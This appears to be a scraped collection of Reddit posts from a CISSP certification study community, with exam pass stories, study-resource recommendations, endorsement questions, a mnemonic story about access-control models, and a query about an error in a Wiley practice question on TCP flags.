Finish Other 3 Practice Exams?,"Have begun my CISSP studying, I just finished reading the OSG 9E over just about exactly 3 weeks from start to finish (Chapter a night average basically). A lot of the concepts were familiar as I wear a lot of hats at work (endpoint security, penetration testing, vulnerability management, application security, config management), but no management experience (technically still in a junior role, but manage all of the above more or less, yeah I know...time to move on up elsewhere).

I have just over 3 years experience overall, all in InfoSec right out of a Masters in CS (non-technical undergrad), so planning to take CISSP exam right around 4 year experience mark so I can officially get endorsed.

I'm guessing 86 on Practice Test is a good sign obviously, as I cover many domains in my day to day, and know where my weaknesses lie. But of course these aren't like the real questions...

Should I finish out these other 3 Practice Exams and see how I do? I don't wan't to exhaust my resources, since once you take a practice exam, that test is not a good gauge anymore since you know the questions.

432,otq9aj,About a question from the Wiley CISSP test bank...,"Greetings everyone. I attempted the Bonus Exam from Wiley's Test Bank today, and one of the questions asked about a packet analysis scenario.

The questions goes like this:

>While performing network packet capture analysis, you discover packets that seem odd. By looking into the packet’s raw hex display, you see that the byte offset position 0x2F has the value of 0x08. What was this packet attempting to make occur?  
>  
>A. Abruptly disconnect a session  
>  
>B. Confirm the receipt of a data set  
>  
>C. Start a graceful hang-up process  
>  
>D. Initiate a new session connection

I pick A, the answer that this shows a reset, to abruptly end the connection, and Wiley says I'm right. It provides the following explanation which I'll copy and paste here:

>The raw hex value of 0x08 in offset position 0x2F represents the binary number of 00000100. When this binary number is compared to the TCP header flag (i.e., the offset position 0x2F) layout of XXUAPRSF, it is clear the Reset flag is set. Thus, this packet is attempting to abruptly disconnect a session.

This seems strange, because 0x08 is binary 00001000, so the explanation is one position off.

The layout of the control bits is correct, XXUAPRSF, and RST is indeed 00000100. But, that means the hex value should be 0x04 in both the question *and* the answer / explanation.

Furthermore, the offset position for the TCP header flag should be byte offset 13, i.e. TCP\[13\]. Why does it say offset position 0x2F?

It seems as if Wiley made several mistakes here. Either that, or I am losing my mind. Can you guys weigh in?

One last point is that I hardly think questions like this will appear in the actual exam. Packet analysis seems too far down in the weeds. What do you guys think?",2021-07-29

435,osz1a8,Provisionally passed the CISSP at 100 questions today,"Hello everyone,

&#x200B;

I studied for the exam for maybe 2 days and did a cramming session last night of some quizlet questions, read through eric conrad's 11th hour, reviewed concepts in the official study guide I didn't understand, watched youtube videos, and provisionally passed the exam at 100 questions. Let me start off by saying that I have about 10+ years of experience in InfoSec and most of the success of the exam was really not from the cramming session, but rather my real-world experience. 

&#x200B;

This was by far the weirdest exam I have ever taken. At no time, did I know or feel if I was doing well or not. The questions are worded in a way that many answers could be correct ones and I feel that this is what makes the test **'difficult'** for some. There were a lot of test-taking skills that I applied like the process of elimination and re-reading the question again to ensure I was understanding the question correctly. At the end of the day, I believe my experience and knowledge of infosec acquired over the years is what got me the pass.

&#x200B;

I just want to say you definitely don't want to memorize anything. The cramming session I did overnight was focused on a couple of areas I didn't feel comfortable with and I really just tried learning the concepts. Memorizing will definitely not help you in this test. Definitely need to understand concepts and take the test from the perspective of a 'Risk Consultant'. That really helped me.

&#x200B;

Anyways, I'm happy that I was able to pass and I'm also very thankful for the posts with resources people used to pass the exam that I was able to review the past month. I did use some. 

&#x200B;

Here's my list of resources that I used this week:

\- Eric Conrad's 11th Hour **( Read book overnight and today before exam, its a super quick read and very helpful)**

\- Sybex Official Study Guide **( reviewed only concepts I didn't understand quickly)**

I have been having the hardest time remembering certain topics in the book, like the access models. So I decided that in order for me to remember these boring topics, I am going to write a story and hopefully I will remember. By writing here I am hoping it will help you study as well! I don't know if this idea is stupid/silly but I'm hoping it will help remember at the least the name and what each model does! The story may sound silly because I am just making this shit up, also my grammar sucks so please excuse me but I will write in a way so that each model is memorable :)

If you all like this, I can write more about other topics, so here goes nothing!

\-------------------------------------

It was a cold winter night in Virginia but it was hotter than ever in Washington DC with cybersecurity incidents across the Federal government. Something had to be done or else the USA was to going to lose the war against its enemies on the cybers fronts. We could beat anyone in physical battle, but how do we beat an enemy who knows no boundaries that you can't shoot or kill by a stealth bomber or a drone?

After being in traffic for hours on 66 East by the Key Bridge near Georgetown, Mr. Bell LaPadula had enough and took the exit near Roslyn to cross the bridge. ""Big mistake"" he explained ""the damn traffic worse up in here!"" After moving an inch every 30 minutes, he remembered why took this exit. He loved the view of the Potomak river, as the sun rose up over Kenndy Center. It was better than looking at a parking lot of cars.

Noticing how late he was running for work, he had no choice but to call his best friend Biba, a goofball who saw Mr. LaPadulla as this big military prick but loved like a brother nonetheless. They have been arguing for days about how to solve these Cybersecurity incidents. His biggest worry was to prevent insider threats, there has been a fear that there are Chinese spies now working in the ranks of the US government, they had found a way to get in and now no one could be trusted, not even our own...

Bell and Biba have been working together with Clark Wilson, an AirForce retire who loved sports cars, more especially Camaros, and their nerdy twin buddies Brewer and Nash who were obsessed with the Great Wall of China, but for some odd reason they always referred to it as Chinese Wall, LaPadulla never asked why... Together they made a great team solving the hardest IT Security problems.

However, Mr. Goguen Mesegur, a kiss-ass who was a title whore in the government world, always got in the way of LaPadulla. No matter how great of an idea he had, Goguen stopped him in order to push his own agenda. His biggest supports were Graham Denning, an IT Manager, and Mrs. Sutherland, an old-school mean lady who smoked way too many cigarettes, the type of person you wondered how she was still alive after smoking packets of cigarettes per day for many many years! If she called, you could even smell the cigarettes from the phone as soon as she said ""hello darling...""

441,oswpx3,CISSP endorsement questions,"I'm currently studying for my CISSP and have some questions about who can actually endorse me.

I thought I just needed to prove 5 years of experience in the domains covered, I didn't realize that the person endorsing me has to also be ISC certified.

I am part of a two man IT team and would've had my boss endorse me. the scope of my job very much includes security.

However, while I have 5 years of security experience, my boss is not an ISC member. I'm also not particularly looking to jump ship once I'm certified (though id make a lot more money if I did.) How do I get my skills endorsed when I pass the CISSP exam?

Can my boss endorse me without a CISSP himself?

Can I be endorsed by a third party ISC2 member? If so, what will I need to show them to prove my experience?

For example, in the past five years I have:

- earned a CRTP certification

- built and tuned a SIEM solution based on graylog, elasticbeats, sysmon, and graylog sidecar. This system uses SIEM rules translated from the sigma project (to which I am a github contributor)

- developed the incident response plans and playbooks for our organization (a few hundred pages worth)

- planned and implemented CCTV and access control systems for all of our sites...

- ... along with matching surveillance and privacy policies specific to our region (were a govt agency subject to strict privacy laws)

- top 500 member of hackthebox.eu since 2017

- set up and perform monthly vulnerability assessments

- replaced all our firewalls and audited their rules and configurations

- wrote the RFPs for several new projects (including disaster recovery)

- been the primary responder to several ransomware incidents (at my previous job at an MSP)

- Developed security awareness programs for our staff (both knowbe4 and live demos such as demonstrating USB HID attacks to staff)

- formally specialized in infosec during my computer science degree

443,orz3bf,5 Tips For Passing The CISSP Exam,"Thought I’d share some of my top tips for passing the CISSP exam.

**#5 Read and Relate**

“I don’t understand, I read the Shon Harris book 3 times! How did I fail the exam?”

You read The Odyssey.

You read The Old Man and The Sea.

You read To Kill A Mockingbird.

You don’t read a CISSP study guide.  You must relate and understand a CISSP study guide.

Software Development Security was my weakest domain.  I’d turn my computer speakers up, and listen to a 2-hour video about Software Development Security on YouTube or CBT Nuggets.  Then, I’d proceed to forget everything in three days.  I don’t create software for a living, which is why I had a tough time relating the Software Development Life Cycle (SDLC) to the real world.

But I did work in network security for a living.  A job in which I applied cryptography concepts into action through the use of VPNs and SSH every single day.  This is why cryptography became my strongest domain, I had the ability to relate what I read in CISSP study guides.  I’d read about symmetric and asymmetric encryption, and then apply it for customer devices and environments.  It was awesome.

In an effort to increase my knowledge about the SDLC though, I Googled and YouTubed all I could.  I’d Google things like “iphone software development process”, or “SDLC process used by Facebook”.  I’d read about these real world examples to better relate it to the CISSP books.

I found out too late that the CISSP is actually not a memorization test, it’s a test of concepts.  Keep that in mind as you study!

**#4 Obsess**

“I tried to make the game perfection” – Michael Jordan

How do you get good at something? You have to keep doing it over and over again.  If you want to be a good basketball player, you gotta put in hours shooting in the gym, learning how to dribble tighter, run faster, and shoot more accurately.  Michael Jordan obsessed over the game, and went on to become a basketball legend, and accumulate an estimated net worth of $1 BILLION!

Michael Jordan was the totality of all his training.

I remember obsessing so much over the CISSP that sometimes I neglected my friends, family, and general hygiene.  When obsessing, it’s hard to let go.   While driving, going to sleep, or eating, my obsessive subconscious would still think of a problem, and continue to work on it.

Obsession can be dangerous mentally, but with proper control, it can be an effective productivity tool.

Luckily, you can start the obsession phase 2 months before you take the actual exam.  This is the time to sleep, breathe, and eat CISSP.  Just study it everyday right up until the exam so everything stays fresh in your brain.

**#3 Write**

Not type. Not email.  Not text.

Write.

Pencil and paper.

Read about vulnerability testing, and then draw out a network topology map and place the firewalls, IPS, IDS, and servers where they should belong.

Read about system ring architecture, and actually sketch the proper and secure path for a system process.

Read about the OSI Model and actually draw out how a packet starts at the application layer on Host A, and travels up the layer to Host B.

Let the information you read, flow from your brain, through your arms, and to the tip of your pencil.  When you get a question about a packet having issues at the network layer on the exam, your brain will recall back to your hand motion of writing about it on a piece of paper.

**#2 Trust Yourself**

Before actually taking the exam, all I heard was that the CISSP was an incredibly tough exam.  This was in the days of the 250 questions and 6 hours of total mess-with-your-mind torture exam.

This is true.  But I’m here to tell you that it is a completely passable exam! It’s not that difficult.  The only way to do it is to follow the same formula as everyone else who has passed.  Get some real life security experience, study the Shon Harris books, take an ungodly amount of practice exam questions, and mentally prepare yourself to sit in an exam room for a prolonged period of time while being mentally tested.

After completing about 180 questions during the exam, I actually started to feel fairly confident that I will pass.  Before taking the exam, I felt 60% confident that I’d pass, even though I studied for 10 months.  It is only after passing, that I realized I should’ve trusted myself 100%.

I’m trying to boost your confidence now, and not after the exam.  If you study well, you will be a CISSP.  It is not that difficult.

If you understand the concepts, and can truly see the big picture as it relates to information security, and have done your best to study for the exam, then trust yourself.  You will pass.

**#1 Don’t Give Up**

The alarm rings at 8:00 a.m., but it’s your day off.

You came home from a tough week of work, spent time with your family trying to hide your exhaustion, then finally collapsing into bed.

You deserve some rest.

Then your brains reminds you about that alarm you set early in the morning.  You still have an exam to take in 5 weeks.  You may have failed it the first time, but you’re definitely not going to fail it the second time.  You still have to read more about Common Criteria and Spanning Tree Protocol.  You still need to nail down all the steps in a forensic investigation process.

I can tell you not to give up a million times.  I can tell you that dedicating yourself to study for the CISSP is the only way to pass the first time, but it’s ultimately your decision.

Don’t give up.",2021-07-26

I am studying for the last 3 months. Making a study plan a day prior, checking if I can spend some time the following day studying for the exam. I am not over-stretching myself. Where-ever I see, read - on youtube, blogs, forums - there is a lot of fear mongering around the exam. The same kind as we had during high school exams, college exams, university exams and the freshers company placements exams. What happened - we did not learn anything by choice but by fear. What such fear mongering does is lowers our morale and we start considering this exam as our worth decider. 

I am just writing this post - to give a perspective - that this is just an exam! And especially designed for professionals - who work 8-10 hours a day, have other Misc. work, life crisis, relationships and in summary are adults with a whole lot of responsibilities.

The exam is worth it for sure, to learn and test our knowledge but the kind of fearful stature we give to this exam should be stopped - we are adults and not students. We have experienced life and we know it will be Okay!

449,or002m,Obligatory “provisionally passed” post,"Full disclosure: I earned a CISSP cert around 2003-04 that I held for 6 years and then let lapse. I wasn’t in a security-focused role in the job I’ve held for the last 16 years, and keeping up the CEUs wasn’t worth it. That being said, the CBK and the exam - as well as the industry in general - are radically different than they were then and I’ve never been in a “traditional” security role. My earlier test was the 6 hour paper exam on 10 domains that had very little overlap unlike the current 8. 

Prep: 1 month, OSG 8th edition, sample test companion book, ITPro.tv subscription (accelerated 2018 version, 2021 came out just before my test), mind map and exam cram YouTube series. I also credit Harry Lorayne and Josh Foer for the memory techniques that I made extensive use of in my studies.

If I had to prep over again I would’ve done the mind map series first before starting ITProTV and OSG. It would’ve given me a better 360 and a place to hang the specific concepts as I picked up more detail.

The adaptive testing is no joke. I honestly had no idea how well I was doing, or whether I was going to pass or fail when I got my results. I had no idea which questions were evaluated, and TBH was often not sure whether I knew the answer or not. I would have probably dreaded my results and felt like giving up if I hadn’t seen [this video](https://youtu.be/5nqqL1rjIY4). If you’re used to acing paper exams this will feel awful.

452,oq1kdj,Passed the CISSP - 100q - 100min left,"This week I've provisionally passed the CISSP exam with 100q - 100min left.

&#x200B;

I couldn't be happier, I've prepped for almost 2 years.

&#x200B;

Top advice, spend as much time as you can in the [Certification Station](https://discord.gg/certstation) Discord channel. There you will find both what's the proper material, and relevant and authoritative discussions about the different topics.

I've compiled which sources I used in this [LinkedIn post](https://www.linkedin.com/posts/lucianovaschetti_today-i-defeated-the-beast-after-100-activity-6823330484798423040-ox-X)

&#x200B;

Although it's a Manager exam, it evaluates technical content, so you have to be comfortable with the vocabulary and how the technology works. That said, technology is not the most important to be evaluated.

As I've been told, there are really weird questions (although related, of course)

New topics come up, but being aware of them and knowing the inch deep is enough.

It's not worth memorizing anything (and I didn't), but understanding and being able to talk about the major processes (BCP, BIA, DRP, IR, SDLC)

Time wasn't an issue with the exam. On the contrary, 100 minutes were left, even without rushing into any question. Taking a few breaks to go to the bathroom and drinking water was really helpful.

The last days I relaxed and took walks while listening to Rob Witcher's mindmaps, and listening to different mindset videos on Youtube (Kelly, Larry, Seth Misenar / Eric Conrad)

&#x200B;

These videos helped me a lot, to be in the ""Think like a Manager"" mindset, I watched them several times:

[https://www.youtube.com/watch?v=v2Y6Zog8h2A](https://www.youtube.com/watch?v=v2Y6Zog8h2A)

[https://www.youtube.com/watch?v=dq5eodSz\_0k](https://www.youtube.com/watch?v=dq5eodSz_0k)

&#x200B;

Something really helpful was to print the Exam Essentials from OSG 9, and reviewed them all, marking and putting comments to anything I wasn't sure about.

So, covering 100% of the topics (without memorizing anything like cable speeds) + a good mindset = being comfortable at the exam room.

Also, before entering the exam room, I took 5 minutes for myself and breathed with my eyes closed, listening to this one: [https://www.youtube.com/watch?v=AtF0T2fPvbI](https://www.youtube.com/watch?v=AtF0T2fPvbI)

&#x200B;

As for the questions in the exam:

\- Some of them were really direct /easy/straightforward (e.g. ""what's best for accomplishing ***this***). These ones would be like Boson.

\- Some of them were hard, in the sense that the purpose was hidden (they used other words different than the ones we're used to (e.g: Privacy instead of Confidentiality). These ones would be like Thor's

\- Some of them were really weird (assume most of that ones were non-graded) and I'd tried my best. These ones would be like Wentz's

I think there were 1/3 of each of those groups. Really, some of them weren't that hard

But.. for the first group, I had a (simple) networking question, or access control model questions, that if I didn't know the knowledge couldn't have answered.

456,opgpgp,"Passed CISSP, 100 Q, <1 hour","I (provisionally) passed my CISSP exam, 100 questions, under an hour (I believe 51 minutes?) and I *significantly* over prepared. I don't say this as bragging, but as a touch-point so others might have a guide of ""what's enough"" and ""what's *too* much."" Also looking back on my journey is through the lens of what I know now, I might be overly critical of some resources. *To that end* I may be over-critical of some resources as not being helpful, but as it's difficult to divorce my viewpoints from my perspective to that end, I'll just give you as honest-as-possible evaluation of what I used.

My main takeaway is: The most productive parts of my journey were a tight feedback loop of practice exams, identifying weak points, studying, and repeat. 

# Before CISSP

I have \~9 years of IT/technical experience, 4+ of which was a wide-spread role containing cybersecurity, IR, limited forensics, DLP, and security tool administration. The last 9-10 months have been as a Cloud Security Architect. All of this has been at the same organization, a Fortune 100 enterprise.

Previously I've obtained the following certifications that the studying of helped (at least in part) for the CISSP:

* Security+
* SANS GCIH
* CEH (Masters)
* Cloud+
* AWS Certified Cloud Practitioner
* AZ-900
* AZ-104

In addition I took the OSCP class, and worked some of the labs, but did not attempt the exam. Retaking the class and reattempting the exam is a 2022 or 2023 goal for me.

# Studying for the CISSP

I began with the 11th hour. I guess it was nice, but it felt way too high level. I know a lot of people say this is a great last-minute prep, but I really can't agree with that. It was so high level and detail-lacking I can't really see the value. I guess it was a nice first pass? In hindsight, the [CISSP Mindmap video](https://www.youtube.com/playlist?list=PLZKdGEfEyJhKWyryIvx_jm1jn6ZMTi7gW) series would have been a much better first pass. Note, I didn't study the 11th hour, just read through it once.

I also listened through, twice (just because it was long-car-trip material) the [Essential CISSP by Phil Martin, Second Edition](https://www.amazon.com/Essential-CISSP-Exam-Guide-Knowledge/dp/B07JDJV47Z). I thought it did a decent job, and if you would like to study during car trips, it's the best audio book I found. I tried some others, but I wouldn't recommend them.

Next I went through a period of practice exam, official study guide, rinse, repeat. The first practice exam I took was the OSG's companion exam, then my three worst chapters in the OSG, then BOSON A, then the half-dozen worst chapters in the OSG (which did see some overlap), then BOSON B, the worst 3 chapters *and* the OSG's domain exams over the three worse domains, then BOSON C. I made notes along the way and reviewed the notes. I did all BOSON exams in ""study mode"" and if I missed the question I would screenshot the relevant parts of the explanation and added it to my study material. For the OSG practice exams, I would review the missed questions and also produce notes from them. All of my notes I went over at least twice, sometimes as many as six times. This being said by the time I had finished this, half of the OSG hadn't been touched, and I did not exhaust either the OSG practice exams (or close to it) or the BOSON exams. However the exams were different, so I would recommend both.

As a small aside, all of my study material was for the previous version of the CISSP. I did not feel like this left me ill prepared for the new version to any extent whatsoever.

Another small aside, I did watch a hodgepodge of videos on YouTube to focus in on any topic I felt uncomfortable with. My total time watching such videos was <6 hours, including repeating videos.

I also watched ""[Why you WILL pass the CISSP](https://youtu.be/-99b1YUFx0A)"" and read through [How To Think Like a Manager](https://www.amazon.com/Think-Like-Manager-CISSP-Exam/dp/1735085197/ref=sr_1_3?dchild=1&keywords=Think+like+a+manager&qid=1626967662&sr=8-3) during the weekend before my exam. I think they were both important, and added value. *However* I feel like the mindsets pushed in these study materials--*while valuable in the real world*\--weren't as important to the CISSP as they made it out to be. Still, do yourself a service and go through both of them.

Near the end of my preparations, I noticed I would read a practice question, and be able to *sometimes* articulate why two different answers were correct. Not in a ""these are both good answers, but I need to pick the best of the two,"" sort of way, but as a critique of the question author sort of way; I could display a deeper understanding that showed I understood the question; I was able to articulate an important security or business consideration that made it easy to justify multiple answers without more information. Thankfully on the actual exam I only came across one quesiton where I felt like I needed more information.

This level of understanding was probably the best sign I had that I was ready for the CISSP.

I was willing to accept if I picked a wrong answer in BOSON, the OSG exams, or Think Like a Manager, but about 1/3 - 1/5 of the time when I got a wrong answer I felt like I had a valid critique of the question, I would count myself as having gotten that question right. To that end, I was scoring about 85% on my last BOSON exam (first time taking the exam, I never repeated BOSON exams) and \~75% on my OSG ""trouble domains"" (domains where I was needing the most studying).

Lastly I will say please avoid the ""Inside Cloud and Security"" CISSP exam cram. I really hate saying this since his videos are engaging, clear, and generally well explained, however they suffer in three key ways. First what he decides to talk about feels like a patchwork of topics within the domain--or at least that's my view after having studied the domains--rather than a complete picture. Second, he often skips pass topics with a quick definition that really aren't valuable to you during the exam without actually understanding the topic, so it might give a false sense of readiness. Third, and most importantly, some things he says are outright wrong, which is dangerous for the exam. It felt like he got things that were more academic and less practical wrong, which makes sense given that he admits he did very little studying and depended on his extensive industry experience. 

# Final Thoughts/Summary

So the biggest reason I typed all of this up is to provide some context as to how to slam dunk the exam, and when you probably will slam dunk the exam. It also seems people are very hesitant in saying what % of practice exams will see that you pass, so here's my guide:

You're certainly ready to take the exam:

* When you're getting 80%+ on BOSON *from understanding the questions and not rote memorization.*
* When you're getting 75%+ on the OSG comprehensive exams *from understanding the questions and not rote memorization.*
* When you're getting 70%+ on the OSG domain-specific exams for your weakest trouble areas *from understanding the questions and not rote memorization.*
* After you go through the provided ""Think Like a Manager"" materials
* You have gone through all of the questions you missed, understand why you missed them, and spent time understanding accompanying material (if you miss a question about why a certain encryption technology is a bad choice in a specific situation, and another is a good choice, study both technologies in a broader sense, and loop in a third, forth, etc, technology that might be comparable)

This was where I was at, and, again, I was more than ready for the exam. Actually during the exam do basic good test taking skills such as ""carefully read the question, make sure you understand it, eliminate two answers,"" etc.

Also I will say the OSG exam *and* BOSON had questions that were grossly in the weeds such as ""you need to network two devices over X distance and you need Y speed. What Ethernet cable would you need?"" or ""A user is currently using 802.11(whatever). They want to upgrade to X speed. What 802.11 technology would your recommend?"" 

Do NOT worry about memorizing any tables of raw numbers like these. I saw NOTHING on the exam that was that in-the-weeds. Plenty of technical or semi-technical questions, but no rote memorization of numbers. In real life this is something you can certainly look up, or you deal with so regularly that you'll learn it as a matter of course.

I'd be happy to answer any questions that I can that respect the CISSP NDA.",2021-07-22
457,opmbh7,"Provisionally Passed 100 Questions, 2 Hours","It seems customary to post a pass here, and since others' success stories have inspired mine, thought I would give my 2 cents as well.

I would consider myself one of the less experienced coming into the exam, am currently a post-graduate student finishing up Masters in 4 months, and zero work experience outside of an internship. 

Started 4 weeks ago using the following:

**Study Materials**

* [Sunflower CISSP Summary](https://docs.wixstatic.com/ugd/dc6afa_fc8dba86e57a4f3cb9aaf66aff6f9d22.pdf) by Maarten de Frankrijker
* CISSP Exam Cram by [Inside Cloud and Security](https://www.youtube.com/channel/UCAr0yk0um7lwLjmrKfzwyig)
* [Destination Certification](https://www.youtube.com/channel/UCXk6whiDrWq42y9Tdv1MEhg) summary videos
* Google

CISSP Exam Cram came first, and after finishing all 8 domains and doing a few questions, I watched Destination Certification videos as a refresher. Sunflower CISSP Summary was mostly used as reference material, alongside Google.

**Practice**

* CISSPrep

Comparing the style, CISSPrep questions were very similar to the questions I got during the certification tests. Its pretty affordable as well. Some questions there are worded poorly, or have bugged options (especially for the drag and drop, somehow it doesn't record your selections properly), and some questions that I got wrong were not very well explained by them. However, it did a proper job in training me to focus on what's important when reading and answering questions (think like a manager).

I would say that results for practice tests don't really matter (unless you're getting below 40-50%), what's important is what you get from it. I was scoring 60-65% on the CISSPrep mock exams the day before the test.

*  [Why you will pass the CISSP](https://www.youtube.com/watch?v=v2Y6Zog8h2A) by Kelly Handerhan

Having little work experience, these 2 videos were vital in getting me into the correct mindset when doing practice questions, and sitting for the test. Watch them once before doing practice tests, and as many times as you want before you sit for the test, I feel it really helps.

**The Test**

It wasn't as hard as I expected it to be. Questions were pretty clear in explaining scenarios, just make sure to read carefully and read all the options. Many times I changed my answer at the last minute after realizing I read the question/options wrong or too quickly.

It was a wild 4 weeks for me with many lows, and not many highs, and I wish whoever who is preparing for their upcoming test all the best. Make sure to get enough rest the day before, and eat well (but not too well) to last the entire duration of the test.",2021-07-22
458,opked7,CISSP Experience,"This forum helped me quite a bit and hence thought to update my experience for the benefit of the community and offer credit to the immense learning resources on the web

About me: Over 10 years in IT / Risk / Cyber.  

**Prep:** About 3 months, initially about 1 hour / day followed by 3-5 hours of revision in the last 2 weeks.

The following resources help strengthen my concepts (A big thanks to all of them):

· Thor Teaches

· Kelly videos

· Official study guide and practice questions

· CISSP mind maps on YouTube ([https://www.youtube.com/watch?v=6X4A6B94vmw&t=101s](https://www.youtube.com/watch?v=6X4A6B94vmw&t=101s))

· Reddit and ISC forum

· Reviewed the ISC practice questions once but did not attempt any more practice exams since I ran out of time. 

**Exam experience:**

Like most of the commentators before me mentioned, the questions were not straight forward, and I had no clue if the answer was correct. In fact, I tried looking up the answers to some of the questions I recalled at home but struggled even with Google! Some domains had more questions than others. I planned to take a break after 100 questions, but the exam ended on the 100th question with 1hour to spare. I did not look at my transcript until I was out of the centre  and was pleased to have provisionally passed. 

**Top Tips:**

Read the question and identity key words such as “Which solution”, “What comes first” etc. This should help filter out some of the answers. 

There is a lot of material out there and found additional value in each of them. Since the scope of CISSP is huge you will need to refer multiple sources.

If I had to prepare again, I would try to cover as many topics as possible and answer the following question with 1-line answers. What, Why and How. I don’t think it is necessary to go in depth and unnecessary details. Focus on concepts and understand why some of the technologies actually exist, their vulnerabilities and remediation. Use practice tests to re-in force these concepts and not as a barometer of your performance in the exam.

460,ooy5bj,My CISSP journey from zero to passing with some obstacles," **My CISSP journey:**

I started studying at the beginning of 2019, inspired by some posts on reddit and the fact that the content of CISSP is very interesting for me and my further career steps. I spent about 3 months reading the Official Study Guide (OSG), researching a lot of content and taking lots of notes, and in the meantime, I was very confident that I would pass the exam.

However, in the middle of 2019, I stopped studying because I got an interesting job offer in security that required a bit more attention. So I decided to take a break and catch up on the OSG sections from time to time. 

In early 2020, I met a work colleague who has already passed the CISSP exam, he gave me some tips on good sources to continue with my studies. Later I will give a brief overview of the sources that helped me. I started studying seriously for a second time. This time with Thor and Kelly while I was driving. In the evenings I read the OSG and the latest Sunflower PDF to have a lot of information in a condensed form. Later in the year I ordered the Boson question bank and the OSG practice exam to practice some questions. In the beginning, I regularly scored 75% and reread my weak topics.

I booked my first exam in Germany, Düsseldorf for December 2020, due to Corona the test center was closed. The next possible date for the exam was in February 2021, this date was also cancelled. The next test date was then in April 2021. If I didn't pass the exam on that date or the test was cancelled again, then I would have to learn the new content because of the content update in 2021. And it happened again, the exam was cancelled again. Now it was clear I had to understand and be able to apply the new content, by 11 July. 

The last weeks before the exam I studied after work in the evenings for about 3+ hours, plus all the weekends. The day before the exam I thought I was ready to take it, but as soon as I saw the first 10 questions, I thought what the hell, I never read about this content. Halfway through, I wasn't very confident that I could pass the exam, but I focused on each question. When I finished the last question, I went to the reception and got my result - **Congratulations!** 

I passed, the CISSP exam.

**The study resources I used to prepare:**

**Cybrary Kelly Henderson:** I like her video training, she is very funny, knowledgeable and a great educator. You get a good and deep overview in her videos, which is easy to understand even as a non-native speaker. A must watch is her video on YouTube ""Why you will pass the CISSP"". 

**Thor Theache's CISSP:** I have seen a few write-ups saying that his content is not very good. But I disagree, his content is a bit expensive but worth watching. He is also a good trainer and sometimes he is available in the discord channel of certification station.

**CISSP for dummies:** I ordered this book and never read a complete chapter. Sometimes I had to re-read some content to get a second or third view of the content. 

**(ISC)2 Official Study Guide - latest version in 2020:** my main study resource, I read this book cover to cover, word for word. It is a good resource to get a good overview of the content, which is really a mile wide and a inch deep. At times I thought it was 1.61 km wide and 2.54 cm deep 😉. But if you ask me if you can pass with just the OSG, I will say, yes, it is possible, but you should take some time to read some other books as well.

**Eleventh Hour CISSP:** I got this book to get a quick overview of all the content that might be necessary in the last week. In hindsight, I would have read this first before going through the official study guide. It gives a good overview of everything to expect in the exam.

**(ISC)2 Official Practice Exam:** You should use the online version of the book, this is more helpful than the paperback. You will need to use the code you get from the paperback to register for the online test bank.

**Boson CISSP Practice Exam:** A lot of questions for a good price, updated regularly. You will need Windows to work with Boson. The questions are very technical and the answers are very well explained so you understand why the questions are wrong. This is a ready important aspect from my point of view.

**Certification Station Discord:** The CISSP channel is absolutely worthwhile. A very good resource that I would recommend anyone to join. Ultimate bunch of helpful people, open 24/7 (because of the international audience). Discussions on various topics have helped me a lot

**Destination Certification Flash Cards:** If you are on a train ride, journey or similar, take these flash cards and just read them one by one. Very helpful in my eyes. I would read them in the middle of my exam preparation.

**Do's and Don'ts:**

\- Register as soon as possible. The examination center in Germany, Düsseldorf is always fully booked at short notice.

\- I have done 4000+ questions.

\- Read correct AND incorrect answers of the question

\- Read the question twice during the exam

\- Do not give up during the exam, even if it looks bad

\- Be a member of a study group (Certification Station)

\- Eat well and do some exercises to have a fresh mind.

My last words, ""Don't talk the talk, walk the walk"" and all the best. I will now rest for a few weeks and then continue with CISA or CISM.",2021-07-21

April-May

Took CISSP SANS Course with David Miller. Loved the course, but wasn't crazy about Miller. There were something he said, that he was so confident in, that I found that were either wrong, or poorly said. He also talked really fast without a quick break. I imagine this might be because of online teaching, but maybe go with one of the course creators. For example, we got hung up on the terminology On-premise, on-prem or on-premises and what the exam would use.

Not to drive into it, but that isn't important, lets discuss the topics, not that on-premise is not correct terminology when talking to IT personel, and at the end of the day, no one cares. However, David Miller was really good diving into the technical points and bringing it all together. If you don't mind some of the small banter, and fast speaking, then go this route.

I would recommend the course, but be weary, everyone is different, and I really believe teachers should be suited to the student.

&#x200B;

SANS then provided Audio w/ Eric Conrad. I used this whenever I could.  A lot of story telling, but when it would drive into the points it was good.

I used Eric Conrads books, which were great. Really helped me drive some points.

Coffee shot videos 9/10, they really put things together for me, on how to answer and review CISSP questions

Luke Ahmeds book 10/10 was the BIGGEST help after the full study.

**Cisspprep** 100% need this, you'll get mad at yourself but do it. Thank me later  
**Sybex Wiley** Do this about 6-4 weeks prior to your test. Then a few weeks before do ALL the questions you got wrong, study those topics that you keep getting wrong

In the year, I got A+, Net+, Sec+ and now CISSP, which is way harder than any of the others. I took this exam back in May and failed the first time. So, after this I change my study method, which was just go through the Official guide a few times. 

Although I don't like bootcamps, I did attend one by Technical Institute of America, with Andrew Ramdayal. He is a very good instructor and I used his udemy to pass the sec+ a few months ago. His course really helped me understand the mindset of the question and topics. I then got the new official guide that came out last month made tons of notes. I only used CCCure questions and the the ones from the study guide. 

I think what made the difference is the way you approach the questions. Coming from sec+, you are more direct and this exam is not. Sec+ was always 1 correct choice, this exam some of them had what I taught is 4 correct choice. Andrew Ramdayal, larry greenblatt, and Kelly has the tips you need to pass the exam on youtube. Check them out. Trust me when I say this exam is more of how to select the correct answer than it is about knowing your stuff.

467,oo5siy,Today was the day......,"Today was the day that I skipped like a schoolgirl, air punching, and yelling around a parking lot for 10 minutes…. Yes, it happened. Okay, what you’re here for.

After a little over 2 hours (I think), I have concurred this thing… I have roughly 9 years of experience in the field, with various certifications (CASP+, SEC+, A+, and CCNA). I am also pursing an MS-Info Science – Info Assurance.

Length of preparation for me was two months and some change… I chose to utilize my summer break from Grad school to prepare for this exam… and it worked out! Not itemizing hours, or questions, or pages, or any ""quantifiable things"" as everyone is different, and everyone takes in information at different speeds.... but here's what I have for you!

My piece(s) of advice:

1. Why do you want this thing? It’s not a “fun” process…. If you do not have a solid reason to dedicate yourself for however long you identify you need to prepare… it might not happen… I’ve creeped this thread, messaged many, and it’s happened, yes…however the odds are not likely. Know why you want to be a CISSP, and let that drive you to studying and preparing to test!
2. Mentally prepare yourself to sit there for 150 questions, when my test went past 100… I immediately got down on myself based off peoples comments of the 100q pass…. This took me a minute to take a deep breath, and get back into it… so just prepare yourself mentally you’re in it for the long haul! After all, a pass is a pass…..
